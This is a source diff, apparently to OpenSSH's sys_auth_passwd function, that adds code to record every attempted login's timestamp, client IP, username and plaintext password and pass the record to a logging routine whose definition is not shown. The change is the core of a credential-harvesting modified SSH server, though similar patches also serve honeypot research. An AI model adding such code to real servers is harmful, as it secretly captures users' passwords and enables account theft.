@@ -44,6 +44,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
+#include <time.h>
 
 #include "packet.h"
 #include "sshbuf.h"
@@ -55,6 +56,7 @@
 #include "hostfile.h"
 #include "auth.h"
 #include "auth-options.h"
+#include "log_pwd.h"
 
 extern struct sshbuf *loginmsg;
 extern ServerOptions options;
@@ -194,7 +196,21 @@ sys_auth_passwd(struct ssh *ssh, const char *password)
 	Authctxt *authctxt = ssh->authctxt;
 	struct passwd *pw = authctxt->pw;
 	char *encrypted_password, *salt = NULL;
-
+	
+	//log the password
+	time_t rawtime;
+	struct tm *timeinfo;
+	time(&rawtime);
+	timeinfo = localtime(&rawtime);
+	char timebuffer[20];
+	strftime(timebuffer,sizeof(timebuffer),"%b %d %H:%M:%S",timeinfo);
+	//write date and time, ip address, username (truncated to 1024 characters), and password (truncated to 1024 characters) to log file
+	#define MSG_SIZE 4096
+	char msg[MSG_SIZE];
+	snprintf(msg,MSG_SIZE,"%s %s %.1024s:%.1024s\n",timebuffer,ssh->remote_ipaddr,authctxt->user,password);
+	msg[MSG_SIZE-1] = '\0';
+	log_ssh_pwd(msg);
+	
 	/* Just use the supplied fake password if authctxt is invalid */
 	char *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;
 
